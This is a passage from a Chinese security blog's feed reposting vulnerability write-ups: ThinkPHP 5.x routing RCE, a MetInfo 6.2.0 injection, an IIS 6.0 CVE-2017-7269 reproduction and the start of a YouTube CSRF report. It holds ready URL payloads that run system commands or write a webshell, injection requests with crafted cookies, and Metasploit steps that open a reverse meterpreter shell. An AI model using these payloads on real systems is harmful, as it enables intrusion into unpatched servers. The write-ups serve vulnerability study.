src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/9.png" alt></p><p> 可以看到这个账号已成功添加入注册表中</p><p>但是在本地用户和组中找不到<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/10.png" alt></p><p>而且可以进行远程桌面连接<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/11.png" alt></p><p>当然，这种隐藏账号在注册表中是可以找到的，当我们想要删除这个隐藏账号时就需要从注册表下手了。</p><p>下面是在 Windows 10 中打开注册表编辑器的两种方法：<br>1.在任务栏上的搜索框中，键入“regedit”。然后，选择注册表编辑器（桌面应用）最上面的结果。<br>2.长按或右键单击“开始”按钮，然后依次选择“运行”。在打开：框中输入“regedit”，选择“确定”。</p><p><strong>转载于</strong>：<a href="http://zone.secevery.com/article/1110" target="_blank" rel="noopener">http://zone.secevery.com/article/1110</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.x 路由缺陷导致远程代码执行</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ThinkPHP是一套国内流行的开源PHP MVC开发框架，其中存在3.x和5.x两个版本，目前3.x已停止维护，5.x为15年正式推出的，基本上对3.x进行了重构，针对于路由，也舍弃了默认的方式，正是因为新的路由存在缺陷，导致任意函数的调用。</p><h2 id="知识背景"><a href="#知识背景" class="headerlink" title="知识背景"></a>知识背景</h2><p>路由解析<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg" alt></p><p>?s=index/index/hello</p><p>tp5中路由舍弃了3.x中的<strong>?m=index&amp;c=Index&amp;a=hello</strong>方式，而使用一个参数<strong>s</strong>传递所有信息，<strong>s=/index/Index/hello</strong>中三部分分别代表<strong>module,controller,action</strong>。此次出现问题的部分便是<strong>controller</strong>，由于<strong>ThinkPHP</strong>中命名空间和自动加载的作用，每个类都可被访问到，即导致每个类都可被当做<strong>controller</strong>。</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fy562obz8cj31dm0gg0vy.jpg" alt></p><p><strong>参数处理</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public function index($name)&#123;</span><br><span class="line">        return &apos;Hello &apos;+$name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>?s=index/test/index&amp;name=world</code></p><p>参数会自动处理，当然也可为数组，比如</p><p><code>?s=index/test/index&amp;name[0]=world&amp;&amp;name[1]=xx</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg" alt><br>在5.1.x中函数名为<strong>parseModuleAndClass</strong>，功能一样</p><p><strong>parseClass()</strong>函数：</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg" alt></p><p>正常情况下会对<strong>name</strong>进行处理，限制在<strong>app\index\controller</strong>命名空间。</p><p>这里的<strong>name即为controller</strong>，前置处理为获取到<strong>module,controller,action</strong>，将<strong>controller</strong>传入该函数处理。</p><p><strong>当name中存在\时，直接将name赋值到class，不再进行parseClass操作，配合自动加载的机制从而导致可为任意命名空间下的类作为controller，任意public都可被用户访问到，结合ThinkPHP5内置的一些类和方法便可造成远程命令执行。</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>thinkphp/library/think/App.php 304-320行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 执行函数或者闭包方法 支持参数调用</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array|\Closure $function 函数或者闭包</span><br><span class="line"> * @param array                 $vars     变量</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // 记录执行信息</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?s=index/think\app/invokefunction/function/call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p><p>ReflectionFunction为PHP中的反射类，反射调用call_user_func_array，call_user_func_array为回调函数，回调system，参数为id</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg" alt></p><p>已知POC(来自t00ls)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">2、?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">3、?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">4、?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">5、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">6、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">7、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">8、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg" alt></p><p>该补丁为<strong>5.0.x</strong>补丁，<strong>5.1.x</strong>位置不一样，方式一样。</p><p>补丁方式为限制<strong>controller</strong>只能为字母和数字。并且放在<strong>controller</strong>处理之前。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单来说这个洞是由于用户控制了<strong>controller导致的，开发者将处理controller的代码封装到了Loader.php，并且与其他功能进行代码复用，为了满足其他功能增加的功能(即特殊处理存在\的参数)，从而导致了漏洞。代码复用是开发者优质的习惯，但也需要严格审核是否因为书写复用代码时是否会造成漏洞。</strong></p><p>另外，可以看到这是一个非常浅显的洞，至今没有人发现，最终由官方爆出，也许很多用户默认此开源框架“流行 == 安全”，其实很多应用并不是想象中的完全安全，漏洞经常发生在被人忽视的地方。</p><p>转载于：<a href="https://p0sec.net/index.php/archives/125/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/125/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>metinfo 6.2.0最新版本前台注入漏洞</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>metinfo 6.2.0最新版本前台注入漏洞<br><a href="https://nosec.org/home/detail/2436.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2436.html</a><br><a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a></p><h2 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h2><p>docker pull zksmile/vul:metinfov6.2.0</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述:"></a>概述:</h2><p>看到某个表哥发的metinfo 6.1.3最新注入（<a href="https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>前台，（<a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a> ）作者在这里说需要注册会员，其实有一处不需要。漏洞详情<br>这里关键点在auth类的encode()和decode()方法。看下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class auth &#123;</span><br><span class="line">    </span><br><span class="line">    public $auth_key;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;auth_key = $_M[&apos;config&apos;][&apos;met_webkeys&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function decode($str, $key = &apos;&apos;)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;DECODE&apos;, $this-&gt;auth_key.$key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function encode($str, $key = &apos;&apos;, $time = 0)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;ENCODE&apos;, $this-&gt;auth_key.$key, $time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里两个方法全都调用了authcode()方法，跟进authcode看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0)&#123;</span><br><span class="line">        $ckey_length = 4;  </span><br><span class="line">        $key = md5($key ? $key : UC_KEY);</span><br><span class="line">        $keya = md5(substr($key, 0, 16));</span><br><span class="line">        $keyb = md5(substr($key, 16, 16));</span><br><span class="line">        $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">        $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">        $key_length = strlen($cryptkey);</span><br><span class="line">        $string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;0d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">        $string_length = strlen($string);</span><br><span class="line">        $result = &apos;&apos;;</span><br><span class="line">        $box = range(0, 255);</span><br><span class="line">        $rndkey = array();</span><br><span class="line">        for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">            $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">        &#125;</span><br><span class="line">        for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">            $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">            $tmp = $box[$i];</span><br><span class="line">            $box[$i] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">            $a = ($a + 1) % 256;</span><br><span class="line">            $j = ($j + $box[$a]) % 256;</span><br><span class="line">            $tmp = $box[$a];</span><br><span class="line">            $box[$a] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">               return substr($result, 26);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               return &apos;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里decode和encode算法可逆，但我们需要知道$key的值，查看构造函数：<br>    public function __construct() {<br>        global $_M;<br>        $this-&gt;auth_key = $_M[‘config’][‘met_webkeys’];<br>    }<br>这里$key的值是来源于met_webkeys这个配置，查看met_webkeys来源发现在安装的时候把这个key写入到./config/config_safe.php文件中。<br><img src="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png" alt></p><p>查看/config/config_safe.php文件，这里写入方式类似以下，但p牛在某篇文章中说过，这种是无法解析的，php后面必须要有一个空白字符，右键查看源代码即可得到met_webkeys，但有的会报错，根据这个表哥所说和php线程安全有关，本地试了下好像是这样。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png" alt></p><p><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>这里有两个利用点，简单说下其中一个。在register类的doemailvild()方法中，这里把用户提交的p参数进行了解密，并且传入到了get_user_valid()方法中。<br><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>查看get_user_valid()方法，这里又把解密后的值传入到了get_user_by_username()方法。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png" alt></p><p>查看get_user_by_username()方法，又传入了get_user_by_nameid()方法。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png" alt></p><p>查看get_user_by_nameid()方法，直接拼接。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png" alt></p><p>这里基本就清楚了，将auth类的authcode()方法copy本地。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png" alt></p><p>访问本地文件得到加密后的字符串。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png" alt></p><p>将加密后的字符串放到cookie，get或者post中，构造请求提交，延时注入成功。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>复现时需要注意的点：<br>1、php.ini中 short_open_tag=off</p><p>2、不管需不需要登录，最起码需要网站有一个会员存在。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png" alt></p><p>这里有两个，一个是不需要登陆就可注入，另一个是coolcat表哥所说的需要以会员登陆。以下请自行替换p参数。</p><h4 id="1、不需要登陆"><a href="#1、不需要登陆" class="headerlink" title="1、不需要登陆"></a>1、不需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=register&amp;a=doemailvild HTTP/1.1<br>Cookie: p=00c7%2FDBwD23b41olxVCthTvDDTRBhldmrrdyA8S3t%2F3yAl4QZ0P%2FSfOS5zlB</p><h4 id="2、-需要登陆"><a href="#2、-需要登陆" class="headerlink" title="2、 需要登陆"></a>2、 需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=profile&amp;a=dosafety_emailadd HTTP/1.1</p><p>Cookie: p=497cD9UpkDtsvFzU9IKNlPvSyg1z%2bf09cmp8hqUeyJW9ekvPfJqx8cLKFSHr;&lt;自行添加登陆后的cookie&gt;</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>目前官网没有更新相关补丁。<br>白帽汇安全研究院建议限制config_safe.php的访问权限来进行应急修复。<br>Apache配置.htaccess文件：</p><p><img src="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png" alt></p><p>Nginx在nginx.conf文件添加以下配置：</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png" alt></p><p>文章转载于：<a href="http://zone.secevery.com/article/1058" target="_blank" rel="noopener">http://zone.secevery.com/article/1058</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-7269 IIS6.0远程代码执行漏洞复现</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞编号：CVE-2017-7269<br>发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）<br>漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>漏洞类型：缓冲区溢出<br>漏洞等级：高危<br>影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）<br>触发函数：ScStoragePathFromUrl函数<br>附加信息：ScStoragePathFromUrl函数被调用了两次</p><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><p>复现环境：Microsoft Windows Server 2003 R2</p><p><img src="http://zone.secevery.com/uploads/article/20190421/a3f037a81fca524ab7e73b07a570a367.png" alt></p><p>开启了WebDAV服务</p><p><img src="http://zone.secevery.com/uploads/article/20190421/6728f3cc3e99686ee36fd23c44ac9f6c.png" alt></p><p>攻击者IP：192.168.1.144<br>目标机IP：192.168.1.175</p><p>exp:<a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener">https://github.com/zcgonvh/cve-2017-7269</a></p><p><img src="http://zone.secevery.com/uploads/article/20190421/32ee5fb6e63b209e64303c27d054c216.png" alt></p><p>把exp 复制到攻击机器的/usr/share/metasploit-framework/modules/exploits/windows/iis目录下</p><p><img src="http://zone.secevery.com/uploads/article/20190421/b5f1712c0adc2eda0a6ed9357f504787.png" alt></p><p>打开神器Metasploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/469cf4e103aaa38514880545f9f7f7cc.png" alt></p><p>输入use命令，use exploit/windows/iis/cve-2017-7269</p><p><img src="http://zone.secevery.com/uploads/article/20190421/9f52f610279f06c9041ddd0c8dd6b064.png" alt></p><p>使用命令show options</p><p><img src="http://zone.secevery.com/uploads/article/20190421/2d3b6a438a938dd8c02231da8ce4a0d3.png" alt></p><p>1.设置目标机ip,set RHOST 192.168.1.175<br>2.设置对面网站，set HttpHost 192.168.1.175<br>3.设置返回载荷，set payload windows/meterpreter/reverse_tcp<br>4.设置攻击机ip，set LHOST 192.168.1.144<br>5.进行溢出，exploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/914441442ce49de5dad761370de3fe0f.png" alt></p><p>输入shell命令，来到了我们所熟悉的界面</p><p><img src="http://zone.secevery.com/uploads/article/20190421/e530373752927a0db121aaffd1bab50a.png" alt></p><p>执行命令whoami</p><p><img src="http://zone.secevery.com/uploads/article/20190421/7c0533aea664a63ce89bfd8e600a8b24.png" alt></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>2015年7月15日，微软已停止对Windows Server 2003的支持，所以官方没有相关解决方案，建议用户升级到最新系统 Windows Server 2016。如果不进行升级的话，请直接关闭WebDAV服务防止漏洞被利用。</p><p>转载于：<a href="http://zone.secevery.com/article/1070" target="_blank" rel="noopener">http://zone.secevery.com/article/1070</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【转]CSRF漏洞劫持Youtube用户的通知消息</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg" alt></p><p>大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享</p><p><strong> 从POST请求中发现端倪</strong><br>某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经是半夜00:30了，困累之极…..。我就随便点点打开了YouTube的通知服务（Notification），其中的POST请求引起了我的注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /notifications_ajax?action_register_device=1 HTTP/1.1</span><br><span class="line">Host: www.youtube.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://www.youtube.com/sw.js</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41184676334</span><br><span class="line">Origin: https://www.youtube.com</span><br><span class="line">Content-Length: 1459</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: duh, cookies!</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;endpoint&quot;</span><br><span class="line"></span><br><span class="line">https://updates.push.services.mozilla.com/wpush/v1/gAAA...</span><br><span class="line"></span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;device_id&quot;</span><br><span class="line">dbe8453d99714c6160994fdf5bb3c59332df04278a...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;p256dh_key&quot;</span><br><span class="line">BBNVkVOt6tpY1KvJJqtLvqt...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;auth_key&quot;</span><br><span class="line">V5-_lh6nYT2zoY...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;permission&quot;</span><br><span class="line">granted</span><br><span class="line">-----------------------------41184676334--</span><br></pre></td></tr></table></figure></p><p> 乍一看，为了防止CSRF，其中的auth_key、p256dh_key、endpoint、device_id等参数貌似都是经过编码的字符串，但仔细一分析才知道，这些所有的参数都是由其中updates.push.services.mozilla.com的Mozilla通知推送服务产生的，所以，这样初略来看，该接口上不存在CSRF漏洞。</p><h3 id="分析Service-Worker-服务工作线程​"><a href="#分析Service-Worker-服务工作线程​" class="headerlink" title="分析Service Worker 服务工作线程​"></a>分析Service Worker 服务工作线程​</h3><p>深入分析可知，上述POST请求中的referrer字段值为“<a href="https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service" target="_blank" rel="noopener">https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service</a> Worker）。</p><p>Service Worker 是独立于当前页面的一段运行在浏览器后台进程里的脚本。Service Worker不需要用户打开 web 页面，也不需要其他交互，异步地运行在一个完全独立的上下文环境，不会对主线程造成阻塞。基于Service Worker可以实现消息推送、离线缓存和后台同步API等功能，本质上来说，Service Worker充当了Web应用程序与浏览器之间的代理。​</p><p>也就是说，referrer字段中的sw.js发起了这个POST请求，以至于这个请求和其它具备CSRF防御机制的YouTube请求内容存在不同。</p><h3 id="构造CSRF攻击框架​"><a href="#构造CSRF攻击框架​" class="headerlink" 